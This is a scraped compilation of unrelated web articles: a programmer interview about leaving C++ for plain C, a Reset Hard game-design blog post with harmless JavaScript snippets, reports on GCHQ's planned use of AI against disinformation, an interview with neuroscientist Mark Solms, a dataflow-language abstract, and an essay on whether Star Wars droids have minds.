Skills</strong></h2><p><strong>Adam:</strong> Did these guys talk to you and say why are you using templates or-</p><p><strong>Casey:</strong> No. It was just … I mean, I am always as critical of my own habits as I am of anybody else’s, right? If I am aggravated with some piece of software that someone else’s … I’ve had some famous rants about Visual Studio, for example, and how bad it’s gotten. That dialogue, I mean, you might be tempted to think that that is just me complaining about someone else [inaudible 00:04:36] software. No. That dialogue is happening in my head about my programs all the time. I always think they’re terrible, right?</p><p>I’m always going what could I have done to make this less terrible? It only comes out of that. It was me just looking and going like, “There’s probably something to learn here.” Incontrovertible, these guys are better programmers than I am. That’s true. One reason for that could be that I just suck and I’m never going to get any better, so it doesn’t matter. So just keep using C++ and whatever. Right? Another possibility is that I could learn to be as good as they are, and I’m just not taking it seriously enough. I’m not trying. Right?</p><p><strong>Adam:</strong> Yeah.</p><p><strong>Casey:</strong> Yes I’m trying to program, but I’m not trying to get better. Right? What are things I can use to get better? Well, I can look at what they are doing and go, “What about what I am doing is different, and can I assess if any of those are the answer?” Because they might not be. It might be that they just happened to program in C and I happened to program at C++, and they happened to be good and I happen to suck. That’s a totally possible thing that could have happened there. But another thing could be that actually I could be good, I could be writing code as good as they are, but I need to learn what are the things that they know that I don’t?</p><p>What are the practices they have that I don’t have? Right? I always try to do that as much as I can. If I see something that looks like it’s working well, or that they’re getting something done well, I try to go, “How can I reassess what I’m doing to see whether there’s something of that that would make a difference for me?” Because I want to be better, I don’t want to be writing bad code. But it’s not always obvious how to improve.</p><h2 id="trying-just-plain-c-programming"><strong>Trying Just Plain C Programming</strong></h2><p><strong>Adam:</strong> Did you spend time watching them code?</p><p><strong>Casey:</strong> Not in so many words. I never walked into someone’s office and was like, “Teach me how to program.” But I tried to say what are the things I could do that would assess my own practices in light of the fact that I have some good examples just sitting here? Because typically watching a programmer program at that time would have been creepy. I’d be sitting and we’d be like, “Kilroy was here.” I’m peeking up over the chair. A little Casey head pops up. What I did was I was in charge of the character animation system, and I wrote the first version, it sucked. I was going to write the second version as, let me try. Because I started programming C, not C++, and I had become a C++ programmer.</p><p>I was like, “Let me try just going back to see,” because honestly I know how to do it because I used to program [inaudible 00:07:22]. Let me try going back to C and what I’m going to do is I’m only ever going to use one of these features in C++ if I actually can demonstrate to myself that it would create a benefit here. What I found was that literally the only two things that were at all useful were operator overloading and function overloading. Those are the only two. Everything else, I was like, “Yep. The code was better without it.” Unlike most programmers, I actually had the experience of literally taking the time to see, do these features actually improve the code or don’t they?</p><p>I could actually test it because I was fortunate to have the time and control over a project to actually see what happened. From there, I was just like, “You know what? I need to do that for everything. I need to actually start taking this seriously and stop just assuming that because someone else puts something in a language that it must be good.” When you change your thinking to I’m going to evaluate rather than I’m going to trust, what you start finding is that most things most people say are mostly wrong, and the reason for that is they have to be because a lot of them are overlapping.</p><p>Most of the time you see two different people suggesting two different ways to do something, obviously someone’s wrong or there isn’t a better way to do it, meaning it doesn’t matter which one you pick. Either somebody was wrong and one of them was the correct way, in which case there was one that you should have rejected, or it doesn’t matter which way you do this, in which case they were all wrong for suggesting that you needed to do it this way. I think ever since that point in my career, it’s been about 20 years since then, I’ve just always evaluated things as carefully as I could.</p><p>When I see a new thing suggested, I go, “What does this actually yield?” If I look at the difference between doing it this way and doing it in whatever way I would have done it before, and I go, “Does that result in less lines of code, less bugs, less time?” Blah, blah, blah. I go, “Can I make an argument along any of these lines?” What you’ll find out if you do this, honestly, is a lot of the stuff is just a waste of your time.</p><h2 id="the-do-it-yourself-development-aesthetic"><strong>The Do It Yourself Development Aesthetic</strong></h2><p><strong>Adam:</strong> Casey, didn’t just leave C++ behind, he also nurtured this sort of obscenely DIY development aesthetic that’s pretty uniquely his. He doesn’t use an IDE. Just Emacs <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. He doesn’t use make or a build script. He doesn’t use any libraries. He thinks other people should try this approach.</p><p><strong>Casey:</strong> I think everyone should have the experience of building something from the ground up. Most programmers, no matter what they work on, would benefit greatly from having written one thing from scratch, meaning start in a fairly bare language, such as C, don’t use the libraries, just write everything yourself from just basic things. Even better if you want to try assembly language, but assembly language has a bunch of things that you have to do, like register allocation. I’m not sure you get much …</p></div></div>

                <p>In Reset Hard, I eschew tricks and clever programming in favor of direct, honest systems.</p>

    <p>
    Reset Hard is a competitive time-traveling arena shooter about laying traps,
outsmarting your friends, and learning how to do impossible things.
</p>

<p>
    The gameplay is based around that amazing feeling you get when a new idea or
concept clicks and you start thinking about all of the crazy things you can do
with it. Time travel in Reset Hard is like a toy, and I<span>'</span>m constantly encouraging
the player to break down the game<span>'</span>s rules and reapply them in creative ways.
</p>

<p>
    In competitive multiplayer, being able to creatively combine mechanics or
experiment with tools in novel ways lends everything an amazing sense of
tension, because your opponents have access to the same tools you do, and they
can put together dynamic strategies and traps that you might not be able to
anticipate.
</p>

<p>
    But in order to encourage players to be creative, I need to have a system that
supports their creativity. In order to make players feel like anything is
possible, I need a time-traveling framework where anything is genuinely
possible. I can<span>'</span>t have sections of the game where players are supposed to
deconstruct and think deeply about mechanics alongside sections where I tell
them not to look too closely at the details of how something works.
</p>

<p>
    The game needs to be totally consistent.
</p>

<p>
    That consistency dictates that there must never be a moment in Reset Hard where
you see something unexpected or unintuitive and I tell you not to think
about it. Quite literally everything you see in the game is a mechanic.
</p>

</section>

<section>
    
    <p>
    By minimizing the number of abstractions between gameplay and implementation
code, I<span>'</span>ve been able to build a set of gameplay mechanics that I know are
extremely robust. There is no distinction for me between time travel in gameplay
and time travel in code. What this means is that I don<span>'</span>t design tricks or
implement shortcuts to make it look like something is happening; instead I just
make it happen.
</p>

<p>
    This has a profound effect on the way that I talk about mechanics. When I
explain how time travel works I have an extra sense of authority. I never worry
that I<span>'</span>ve forgotten about some kind of edge case or paradox in the game
mechanics. When I talk about mechanics, I don<span>'</span>t use phrases like <span></span><span>'</span>in-universe<span>'</span>
because as far as I<span>'</span>m concerned, Reset Hard doesn<span>'</span>t have pretend mechanics or
separate in-universe explanations for anything.
</p>

</div>
<p>
    Unlike a game like Pokemon, or Animal Crossing, or Amnesia, where my goal would
be to use hidden mechanics to create depth and to allow a player to share an
illusion with me, Reset Hard is an internally consistent simulation. The game
mechanics are facts.
</p>

<p>
    This means that the puzzles and tutorials inside Reset Hard really boil down to
me teaching you how my code works and us exploring the consequences of that code
together. And as long as I stay within that realm, for the most part I don<span>'</span>t
really have to worry much about mechanical <span></span><span>'</span>plot holes.<span>'</span>
</p>

</section>

<section>
    
    <p>
    I<span>'</span>ve presented this so far as a very theoretical, esoteric idea, but it<span>'</span>s really
quite practical.
</p>

<div>
<p><img src="https://danshumway.com/blog/design-is-implementation/images/time-steps.gif" alt="Pixel art showing a player moving through time">
</p>
</div>
<p>
    The explanation of time in Reset Hard is that individual <span></span><span>'</span>frames<span>'</span> of time each
contain perfect copies of the world. When a player moves through time what<span>'</span>s
really happening is that they are sequentially becoming aware of the whatever
the next frame is. The world of Reset Hard is entirely deterministic. If a
player moves backwards in time, all that they<span>'</span>re really doing is shifting their
focus to a previous frame.
</p>

<p>
    Representing this in code is thus relatively straightforward. Time is a bounded
array. Within each <span></span><span>'</span>frame<span>'</span> of time I store an entire copy of a serialized game
state. I don<span>'</span>t anything fancy with computing deltas. I don<span>'</span>t do anything
complicated like rerunning the simulation from a keyframe.
</p>

<div>
<div><pre><code data-lang="javascript"><span>var</span> timeline = {
   <span>length</span> : <span>30</span> * <span>60</span> * <span>10</span>, 
   frames : [{  }],
   <span>waves</span> : [{
       <span>frame</span>: <span>0</span>,
   }],
};

<span><span>function</span> <span>update</span>(<span></span>) </span>{
    _.each(waves, <span><span>function</span> (<span>wave</span>) </span>{
        <span>var</span> world = frames[wave.frame];
        <span>var</span> next_world = world_update(world);
        frames[wave.frame++] = next_world;
    });
}</code>
</pre></div>
</div>
<p>
    Levels in Reset Hard are at most maybe 10 minutes in length, and the memory
requirements for 10 minutes of 30fps game logic is trivial. If memory does
become a problem in the future, or if I just want to make the game more
efficient on lower-end computers, I<span>'</span>ll switch to a more efficient data
compression format for world states. I won<span>'</span>t change the implementation to do
something clever like add partial world states or record keyboard input.
</p>

<p>
    You<span>'</span>ll notice above that I use <span></span><span>'</span>waves<span>'</span> to determine which frames to update and
overwrite. These also appear as game mechanics - there are a set of game rules
determining when a wave gets created, what it<span>'</span>s velocity is, how waves react to
colliding with each other, and so on. Again, this is just me exposing how the
code works.
</p>

<p>
    <span>"</span>But wait<span>"</span>, I hear you asking. <span></span><span>"</span>If the world is deterministic, how does the
player overwrite the past? Surely there<span>'</span>s some kind of implementation trickery
going on there.<span>"</span>
</p>

<p>
    Not so!
</p>

<div>
<div><pre><code data-lang="javascript"><span>var</span> timeline = {
   <span>length</span> : <span>30</span> * <span>60</span> * <span>10</span>,
   <span>frames</span> : [{}],
   <span>waves</span> : [{ <span>frame</span>: <span>0</span> }]
};

<span>var</span> meta = {
    <span>player</span> : {
        <span>focus</span> : <span>0</span>
    }
};</code>
</pre></div>
</div>
<p>
    Player controllers exist outside of time. They use the same system to interact
with the world that I use internally for puzzles. The player focus determines which
frame will be shown to the player; and the player<span>'</span>s input is projected onto the focused
frame so they can direct their avatar<span>'</span>s actions.
</p>

<div>
<p><img src="https://danshumway.com/blog/design-is-implementation/images/time-meta.gif" alt="Pixel art showing a player moving through time">
</p>
</div>
<p>
    This even extends to the physical human sitting in the chair in front of the
computer.
</p>

<p>
    How are the players actions transmitted to the game? The player exists in a
state that I call <span></span><span>'</span>meta-meta-time.<span>'</span> Their actions are projected via a keyboard
and an Operating System into meta-time (the game<span>'</span>s global state). This is why no
one in the game bats an eye when from their perspective someone new just happens
to exist one day. The player exists in meta-meta-time, the player<span>'</span>s avatar is
projected into meta-time, and then their physical presence is projected from
meta-time onto the regular timeline.
</p>

<p>
    Of course at this point I<span>'</span>m starting to stray away from the practical stuff
that I was talking about above. But I bring this up as an example of just how
far I<span>'</span>m willing to go to avoid hand-waving or hiding narrative inconsistencies
with reality. When the story of Reset Hard deviates from the player<span>'</span>s physical
reality, I alter the story. I don<span>'</span>t pretend that reality changed.
</p>

</section>

<section>
    
    <p>
    From a pure engineering perspective, a secondary benefit of all of this is that
the implementation actually becomes a great deal simpler for me to reason about.
I<span>'</span>m building Reset Hard as a one person dev team, so I have a lot of stuff on my
plate: marketing, artwork, design, programming, community management, music
composition and sound work, and so on.
</p>

<p>
    When I<span>'</span>m coding the game, it is highly advantageous for me to be able to keep
one canonical view of my game in my head at a time. If the mechanics of Reset
Hard were based around clever illusions, I would need to remember roughly twice
as much about how the game worked: both the mechanics as related to the player and
the tricks and illusions I was using in code to support those mechanics.
</p>

<div>
<p><img src="https://danshumway.com/blog/design-is-implementation/images/time-multiplayer.gif" alt="Pixel art showing two players moving through time">
</p>
</div>
<p>
    When I talk to people about Reset Hard, often they comment that an internally
consistent, robust system for multiplayer time travel must be extremely
complicated. It<span>'</span>s not. In the game<span>'</span>s current state, there are maybe 300 lines of
code devoted to making time travel work. I expect that by the end of development
that might rise to maybe 600-800 lines of code.
</p>

<p>
    Reset Hard does not have a complicated codebase.
</p>

<p>
    And I can be confident about how that codebase will evolve because I already
know how it<span>'</span>s going to be structured. It<span>'</span>s going to be structured to mirror the
game mechanics; and I know roughly speaking how most of the core mechanics are
going to work. Of course things will evolve; I<span>'</span>ll make decisions based on what
feels good or what adds additional layers of strategy. But I know that short of
changing something totally fundamental to the game, I won<span>'</span>t need to do many
large-scale rewrites.
</p>

</section>

<section>
    
    <p>
    It<span>'</span>s possible to take this philosophy too far. When I first started building an
update system for entities within the world, I experimented with using events
and special methods to pass around information.
</p>

<div>
<div><pre><code data-lang="javascript">
entityA.on(<span>'x'</span>, <span><span>function</span> (<span>properties</span>) </span>{
    entityB.storeProperties(properties); 
});
entityA.on(<span>'x-end'</span>, <span><span>function</span> (<span>properties</span>) </span>{
    entityB.removeProperties(properties); 
});




entityA.update();</code>
</pre></div>
</div>
<p>
    I did this because I was convinced it didn<span>'</span>t make sense for every entity to be
able to access the entire world state. After all, I planned to hide information
from the player. Why should the internal mechanics be different?
</p>

<p>
    There are a couple of reasons why this was a bad idea:
</p>

<ul>
        <li>
            I didn’t actually know what all of the central gameplay mechanics would be
around hidden information. I was building an implementation before I
built a design.
        </li>
        <li>
            I could start with a simpler implementation (letting every entity access the entire world)
and <em>later on</em> do something like filter that world state if I really needed to.
        </li>
        <li>
            An implementation that matched gameplay at this point would be significantly
more complicated than one that didn’t.
        </li>
        <li>
            And finally, when I designed levels and talked to players about them, I didn’t
think in these terms. So I wasn’t getting any …</li></ul></section></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><span>Last week, UK intelligence agency GCHQ revealed its ambition to use artificial intelligence (AI) to combat a number of social ills, including disinformation. Possible applications include detecting deep fakes, blocking botnets and automated fact-checking, a report from the agency said. But these proposals raise both practical questions and deeper quandaries, including who gets to define disinformation.&nbsp;</span>
</p><figure id="attachment_6493" aria-describedby="caption-attachment-6493"><img src="https://techmonitor.ai/wp-content/uploads/sites/20/2021/03/GCHQ-aerial-658x370.jpg" alt="GCHQ AI disinformation" width="658" height="370"><figcaption id="caption-attachment-6493">An aerial image of the Government Communications Headquarters (GCHQ) in Cheltenham, Gloucestershire. (Photo courtesy of the Ministry of Defence)</figcaption></figure>
<p><span>The UK’s security apparatus has become increasingly interested in disinformation and online speech in recent years, following intense focus on allegations that Russia attempted to interfere with the 2016 US presidential election <a href="https://www.thenation.com/article/archive/russiagate-elections-interference/">using social media</a>. </span>
</p><p><span>T</span><span>he Russia report, released by the Intelligence and Security Committee in July 2020, <a href="https://tech.newstatesman.com/policy/russia-report-mi5-social-media">proposed a role</a> for the UK’s security agencies – specifically MI5 – in policing social media content, something it termed ‘defending the UK’s discourse’. It highlighted that MI5 already works with social media companies to identify and remove terrorist content, so was the natural agency to take on an appended role covering disinformation.&nbsp;</span></p>
			
<p><span>The report suggested: “GCHQ might attempt to look behind the suspicious social media accounts that open-source analysis has identified to uncover their true operators (and even disrupt their use).”</span></p></div><div>
<p>Since then, military bodies have become more involved in the ‘fight’ against online misinformation. Nato has taken on <a href="https://www.nato.int/cps/en/natohq/177273.htm">a role</a> countering Covid-19-related disinformation, and GCHQ is currently undertaking an offensive cyber-operation against anti-vaccine content purportedly spread online by ‘hostile states’. “GCHQ has been told to take out anti-vaxxers online and on social media,” a well-placed source <a href="https://www.thetimes.co.uk/article/gchq-in-cyberwar-on-anti-vaccine-propaganda-mcjgjhmb2">told the <em>Times</em>.</a>
</p>
<h2>Using AI to tackle disinformation</h2>
<p><span>In the new paper, GCHQ’s hypothetical AI-enabled tools to tackle disinformation include machine-assisted fact-checking through validation against trusted sources, detecting deep fake media content, detecting and blocking botnets with machine-generated social media accounts, and online operations to counteract malicious accounts.</span>
</p><p><span>The proposals raise some practical questions. The major social media platforms – the main sites of disinformation spread – have already rolled out their own AI-enabled tools to detect disinformation. For example, to help identify viral misinformation, Facebook <a href="https://ai.facebook.com/blog/heres-how-were-using-ai-to-help-detect-misinformation/">uses SimSearchNet++</a>, an image matching model trained using self-directed learning, an AI system that can recognise images and text with only minor tweaks using a tool called ObjectDNA, as well as tools to detect deep fakes.&nbsp;</span>
</p><p><span>It is unclear what GCHQ would add by deploying its own tools – and indeed whether the social media platforms would permit it to do so. Facebook, for example, does not allow GCHQ or other security agencies to run such tools on its platform, although it does work closely with law enforcement in other areas. And </span><span>taking action on social media accounts independently of the platforms could expose GCHQ to legal challenges.&nbsp;</span>
</p>
<p>But a bigger issue for GCHQ’s planned use of AI against disinformation could be the subjectivity of the concept, which has no legal basis in the UK.

</p><h2>Who defines disinformation?</h2>
<p><span>The terms ‘misinformation’ or ‘disinformation’ can be easily abused by states to police civilian speech and restrict freedom of expression. </span><span>A Broadband Commission <a href="https://www.broadbandcommission.org/Documents/working-groups/FoE_Disinfo_Report.pdf">report</a> identifies that governments including Bahrain, Cambodia, Kazakhstan and Thailand have taken this approach. </span>
</p><p><span>“The paradox to highlight here is that governments that appear to be seeking to control speech for political gain try to legitimise their actions by referring to hate speech regulations and anti-disinformation laws,” the report reads. “In other words, disinformation responses risk being used (or justified for use) for censoring legitimate expression – and clearing the field for official disinformation to spread unchecked.”</span>
</p><p><span>Trisha Meyer, an assistant professor in digital governance and participation at Vesalius College of the Vrije Universiteit Brussel, stresses the need to distinguish between different types of ‘harmful’ material, especially between those that are legal and illegal. </span><span>Rights groups have repeatedly <a href="https://www.indexoncensorship.org/2019/04/online-harms-proposals-pose-serious-risks-to-freedom-of-expression-online/">urged legislators</a> to steer away from woolly definitions of ‘harm’ when devising laws for social media platforms – for example, concerning the UK’s upcoming Online Harms bill.&nbsp;</span>
</p>
<p>Citizens should be wary of security agencies, <span><a href="https://www.democraticaudit.com/2018/10/03/audit2018-how-accountable-are-the-uks-security-and-intelligence-services-to-parliament/">whose activities are often closed to public or parliamentary scrutiny</a>, policing public speech, Meyer adds</span><span>. </span><span>“I think there is a need for scrutiny… and accountability is important.” She points to parallels with GCHQ’s <a href="https://www.bbc.com/news/uk-45510662">bulk surveillance programmes</a> that were revealed in the Snowden leaks. “What happens if you get flagged as having posted harmful content and then you get put on a list?” says Meyer. “There’s a lot of that I do think we need to be concerned about.”</span>
</p><p><span>This lack of accountability is exacerbated by the use of AI technologies, which are often inscrutable even to the organisations using them. Platforms including Facebook, YouTube and Twitter have all warned that their increased use of AI for content moderation is <a href="https://www.npr.org/2020/03/31/820174744/facebook-youtube-warn-of-more-mistakes-as-machines-replace-moderators?t=1614784618272">likely to lead to mistakes</a>. “We need to make sure that AI and automated technology isn’t an additional excuse of saying… that we’re unable to be held accountable,” says Meyer.&nbsp;&nbsp;</span>
</p><p><span>An even deeper issue is the fact that these approaches focus on how the problem of disinformation manifests, rather than its root cause. Meyer says that much of the discussion around disinformation focuses on making platforms responsible, rather than the “far deeper-seated societal issues” that might lead people to be susceptible to disinformation or distrustful of the state-endorsed narrative. </span>
</p><p><span>“If you simply take down content, that might solve it in the short term, but it’s not going to help from a longer-term perspective,” she says. “It’s not going to create that social cohesion or that trust that you need in government.”</span>

			<p><span>W</span>hen he was a boy, Mark Solms obsessed over big existential questions. What happens when I die? What makes me who I am? He went on to study neuroscience but soon discovered that neuropsychology had no patience for such open-ended questions about the psyche. So Solms did something unheard of for a budding scientist. He reclaimed Freud as a founding father of neuroscience and launched a new field, neuropsychoanalysis.</p><p>Solms had one other obstacle in his path. Born in Namibia, where his father worked for a South African diamond mining company, he grew up under apartheid in South Africa. Solms later worked at a hospital in Soweto, where a military occupation tried to clamp down on protesters. “Once you reach the end of your studies, you’re required to join the very same army whose victims I was looking after,” he told me. “That was emotionally impossible.” So he fled to England, where he trained as a psychoanalyst, and didn’t move back to South Africa until apartheid was dismantled.</p><blockquote><p>If my brain were damaged, would I be a different person? Where would the original version of me go?</p> </blockquote><p>Solms has spent decades working to reconcile brain science with the study of lived experience. Now, he presents his own theory of consciousness in a new book, <i>The Hidden Spring</i>. Solms believes neuropsychology has been looking for consciousness in the wrong place. “Since the cerebral cortex is the seat of intelligence, almost everybody thinks that it is also the seat of consciousness,” Solms writes. “I disagree; consciousness is far more primitive than that. It arises from a part of the brain that humans share with fishes. This is the ‘hidden spring’ of the title.” The book is a deep dive into modern neuroscience, peppered with surprising explanations for how we think, dream, remember, and perceive.<br></p><p>I reached Solms in Cape Town, South Africa, where he’s stayed during the COVID-19 lockdown. We talked about the brain-mind problem, the biases of neuropsychology and how a family trauma shaped the course of his life.</p><figure data-alt="Paulson_BREAKER"><img src="http://static.nautil.us/18222_b043fb072a239834f9ad2aefe342eb62.png" width="733" alt=""><figcaption><span><strong>WHO AM I?:</strong> “How does all of this complex stuff that makes my life the way it is relate to this bodily organ?” asks Mark Solms, who’s spent a lifetime studying the brain and consciousness, unafraid to go against the academic grain to ask the most primal existential questions.</span><span>Ilhaam Abraham</span></figcaption></figure><p><b>You write about a seminal moment in your childhood when your older brother suffered a serious brain injury. Can you describe what happened?&nbsp;</b></p><p>I was 4 and he was 6. My parents were yachting and I was down at the water’s edge, but he, with some friends, clambered onto the roof of the clubhouse. Then he tripped and fell three stories onto the pavement below and fractured his skull. He lost consciousness on impact and sustained an intracerebral hemorrhage. We were living in a small village, so he had to be flown to a hospital in Cape Town, and he was very lucky to survive the accident. What was so disturbing and really difficult to comprehend for me was the fact that he looked the same, but was utterly changed. He lost his developmental milestones. For example, he became incontinent and his personality was very changed. He was much more emotional, irascible and difficult, but also intellectually, he was changed.</p><p><b>You say this had a profound impact on you.</b></p><p>It did. We underestimate little children. You start thinking, How can it be that the brain is this thing in his head that’s been damaged and now he looks the same but isn’t the same? Where is he? How can this person, my brother, be an organ? I quickly extrapolated that to my own case and thought, “Hmmm, am I my brain and how can that be? If my brain were to be damaged, would I be a different person? Where would the original version of me go?” And it was a tragedy for my parents. They felt terribly guilty.</p><p><b>So as a boy, you were asking some profound questions that neuroscience deals with today. What is the self? And how is the brain connected to our mental experience?</b></p><p>I think I was just plunged into them prematurely because of that event. For me, it was also the question of mortality. If my body dies, I’m going to disappear, and that was just terrifying. And I thought, well, if you’re gone forever, what’s the point of doing anything then? That disturbed me very much and it spiraled me into what can only be described as a depression. I remember feeling in the mornings, What’s the point of going to school? And not being able to summon the energy to tie my shoelaces. Obviously, I don’t believe at age 4 or 5 that I decided I’m going to be a neuroscientist, but in retrospect, it’s clear that the two things must be connected. It’s sort of the solution to that nihilistic despair. Somewhere in my teens I remember thinking, the only thing really worth doing is to try and understand what existence is. What actually is sentience?</p><blockquote><p>My colleagues were horrified that I studied Freud. I had been taught this was pseudoscience.</p> </blockquote><p><b>You went on to study neuroscience—specifically, the science of dreams. How did that figure into your thinking about the nature of consciousness?</b><br></p><p>The particular aspect of neuroscience that interested me was how the mind and brain relate, so neuropsychology was the domain of the neurosciences that was most compelling for me. But when I arrived at university, I was taught about abstract functions—the information processing mechanisms of memory, language, perception, and executive control. There was no interest in the actual subjective being of the mind. When I asked questions about the contents of memory and the dynamics of one’s own lived life, I was seriously advised by my professors that you shouldn’t ask questions like that. It’s bad for your career.</p><p><b>You made a big discovery that overturned the prevailing theory that we only dream during REM sleep. What did you find?</b></p><p>It was just assumed that when your REM sleep stops, your dreams also stop. But I found that human patients with damage to the part of the brain generating REM sleep nevertheless continue to experience dreams. In retrospect, you realize what a significant methodological error we made. That’s the price we pay for not gathering subjective data. You know, the actual subjective experience of dreams is an embarrassment to science. And this is what my professors had in mind when they were saying, don’t study things like that. But you’re going to be missing something rather important about how the brain works if you leave out half of the available data.</p><div>

</div><p><b>Your interest in Freud is very unusual for a neuroscientist. You actually trained to become a psychoanalyst, and since then, you’ve edited the complete psychological works of Freud.</b></p><p>Yes, and my colleagues were horrified. I had been taught this was pseudoscience. One of them said to me, “You know, astronomers don’t study astrology.” It’s true that psychoanalysis had lost its bearings. Freud was a very well-trained neuroscientist and neurologist, but in successive generations that grounding of psychoanalysis in the biological sciences had been lost. So I can understand where some of the disdain for psychoanalysis came from. But to its credit, it studied the actual lived life of the mind, which was the thing that interested me, and was missing from neuropsychology. So I turned to psychoanalysis to find any kind of systematic attempt to study subjective experience and to infer what kinds of mechanisms lay behind it.</p><p><b>Did we get Freud wrong? Did he have scientific insights that we’ve ignored?</b></p><p>Very much so. I’m not going to pretend that Freud didn’t make some gigantic mistakes. That’s to be expected. He was a pioneer, taking the very first steps in trying to systematically study subjective experience. The reason he made so little progress and abandoned neuroscience was because there weren’t scientific methods by which you could study things. Even the EEG was only brought into common use after the Second World War. So there were no methods for studying in vivo what’s going on in the brain, let alone the methods we have nowadays. But the sum of his basic observations, the centrality of emotion, was how much affective feelings influence cognitive processes. That’s the essence of what psychoanalysis is all about, how our rational, logical, cognitive processes can be distorted by emotional forces.</p><p><b>You founded the new field of “neuropsychoanalysis.” What’s the basic premise of this approach?</b></p><p>The neuropsychology I was taught might as well have been neurobehaviorism. Oliver Sacks famously wrote in 1984 that neuropsychology is admirable, but it excludes the psyche, by which he meant the active living subject of the mind. That really caught my attention. So I wanted to bring the psyche back into neuropsychology. Emotion was just not studied in the neuropsychology of the 1980s. The centrality of emotion in the life of the mind and what lies behind emotion is what Freud called “drive.” Basically, his idea was that unpleasant feelings represent the failures to meet those needs and pleasant feelings represent the opposite. It’s how we come to know how we’re meeting our deepest biological needs. And that idea gives an underpinning to cognition that I think is sorely lacking in cognitive science, pure and simple.</p><blockquote><p>That was the biggest mistake we’ve made in the history of the neuroscience of consciousness.</p> </blockquote><p><b>There are huge debates about the science of consciousness. Explaining the causal connection between brain and mind is one of the most difficult problems in all of science. On the one hand, there are the neurons and synaptic connections in the brain. And then there’s the immaterial world of thinking and feeling. It seems like …</b></p></div></div>

<h3 id="abstract">Abstract</h3>
<p>Dataflow programming is a popular and convenient programming paradigm in systems modelling, optimisation, and machine learning. It has a number of advantages, for instance the lacks of control flow allows computation to be carried out in parallel as well as in distributed machines. More recently the idea of dataflow graphs has also been brought into the design of various deep learning frameworks. They facilitate an easy and efficient implementation of automatic differentiation, which is the heart of modern deep learning paradigm.</p>

<p>Many dataflow languages are ‘modal’ in the sense that the dataflow graph is ‘constructed’ in an ambient environment then ‘executed’ using special commands. Simulink, earlier Tensorflow, Lucid Synchrone (LS) or Self-adjusting computation (SAC) are examples of such languages. We are interested in modal dataflow languages in which the ambient environment is a fully fledged functional and imperative language. Such ambient languages make creating complex and large models easier, but they raise questions of language design, safety and efficiency.</p>

<p>LS provides a way to define dataflow graphs through co-recursive equations of streams. In these cases the interesting issue is efficiency, particularly of memory utilisation. A semantically interesting question occurs in the case of languages which allow the explicit manipulation of the dataflow graph using imperative constructs. This is the case of early Tensorflow and imperative SAC. However the meta-programming style of TensorFlow in which special commands are used to construct imperatively a dataflow graph was considered awkward and error prone, and TensorFlow moved away from it. Constructing a dataflow graph imperatively can be convenient, but both Tensorflow and SAC are unsafe, in the sense that ‘illegal’ dataflow graphs can be constructed during the execution, which leads to unsafe behaviour. These problems can be avoided by a judicious language design.</p>

<p>We present an idealised calculus for dataflow with both imperative and functional features using an abstract machine model based on Geometry of Interaction enhanced with rewriting features (‘Dynamic GoI’). Although the language is modal, with distinct executions for the PCF-like fragment and the DFG fragment, the syntax of the language is uniform. So the language lacks the “metaprogramming” feel of TensorFlow and other embedded DSL-like solutions. Concretely, any operator is used in the same way whether as a part of the host language or the DFG. This is akin to operator overloading, except that it is realised an a purely semantic way. Establishing a “semantic context”, defined by its history of execution, is as far as we know a novel approach which, as we shall see, will require a novel approach to semantics. We have also proved safety of the language and its in-principle efficiency. A prototype implementation of the calculus is also described, as a PPX extension of the OCaml programming language.</p>

			<p><span>W</span>hen we first meet L3, Lando Calrissian’s droid co-pilot in the 2018 film <i>Solo: A Star Wars Story</i>, she’s railing against a brutal droid-on-droid cage match in a cantina: “How can you condone this savagery?! Droid rights! We are sentient!”</p><p>When I first saw <i>Solo</i>, my reaction to L3 was mixed. I was thrilled to finally see a character in <i>Star Wars</i> saying out loud what I had been thinking for years: Wasn’t it obvious that droids are sentient—that is, that they have minds just like us? But I was also mildly annoyed that it had taken so long for someone to acknowledge this on screen, after droids had been weirdly treated like mere property in the <i>Star Wars</i> galaxy for decades.</p><p>L3’s companions collectively roll their eyes at her call for droid liberation, and it would appear they weren’t the only ones. <i>The Mandalorian</i> debuted one year later, and even though the TV series is set 19 years after <i>Solo</i> in the <i>Star Wars</i> chronology, it depicts a world, or a galaxy, that doesn’t seem to have improved for droids. Underscoring this point, the star of the series, known as Mando, has a deep mistrust bordering on disdain for droids, illustrated in the very first episode by his insistence on riding in a rickety human-piloted speeder over a superior droid-piloted one.</p><figure data-alt=" Jern_BREAKER"><img src="http://static.nautil.us/18226_ddd580fa02bd7a37592bca4068165e0e.png" width="733" alt=""><figcaption><span><strong>PART OF THE FAM:</strong> Jibo, a cutesy home robot that originated in Cynthia Breazeal’s Personal Robotics Group at MIT, can recognize your face, even look at you. It’s jovial personality (Jibo can crack a joke or two) won over many families who, according to The Verge, felt pained when they learned that Jibo’s servers would shut down. Some planned funerals. But last year, the good news came that Jibo would stay online.</span><span>Wikipedia Commons</span></figcaption></figure><p>Mando’s disdain for droids starkly contrasts with <a href="https://nautil.us/issue/33/attraction/our-conflicted-feelings-for-r2_d2" target="_blank">how we, as viewers, think of them</a>. Droids like R2-D2 and BB-8 are cute; they seem more like friends than objects of suspicion, and people like Luke, Anakin, and Rey treat them in exactly this way. But do they have minds, like L3 insisted? How exactly should we determine this?<br></p><p>This is more than just a theoretical question. Droids are fictional, of course. But the questions they pose about our relationship to them are very real. We may not encounter a robot like L3 in our world in the near future, but advances in the currently fragmented fields of AI and robotics suggest that something like her could arrive sooner than many realize.</p><p>For example, AI language models can already generate text that is <a href="https://nautil.us/issue/89/the-dark-side/welcome-to-the-next-level-of-bullshit" target="_blank">often indistinguishable</a> from human writing (though they still have room for improvement<sup>1</sup>). In the field of robotics, some engineers have focused on mobility and dexterity: You may have seen <a href="https://youtu.be/fn3KWM1kuAw" target="_blank">videos</a> of Boston Dynamics’s agile but faceless (and arguably creepy) robots designed primarily for industrial and military use. Other engineers and researchers have focused on so-called social robots, designed for human comfort in education and caretaking roles. One example is the recently resurrected Jibo,<sup>2</sup> basically a cutesy Amazon Echo that recognizes your face and moves to look at you. It originated in Cynthia Breazeal’s Personal Robotics Group at MIT.</p><blockquote><p>How do you decide if a drone has a mind? Your cat? Your best friend?</p> </blockquote><p>As it happens, Boston Dynamics’s Atlas robot bears a passing resemblance to L3, and Jibo looks a little like BB-8. Partly for this reason, it’s not hard to imagine that these separate threads of development might one day converge, and we could be standing face-to-face with a real-life <i>Star Wars</i>-like droid within our lifetimes. So the question of how we decide whether L3, BB-8, or <i>The Mandalorian</i>’s IG-11 have minds is really the question of how we will decide 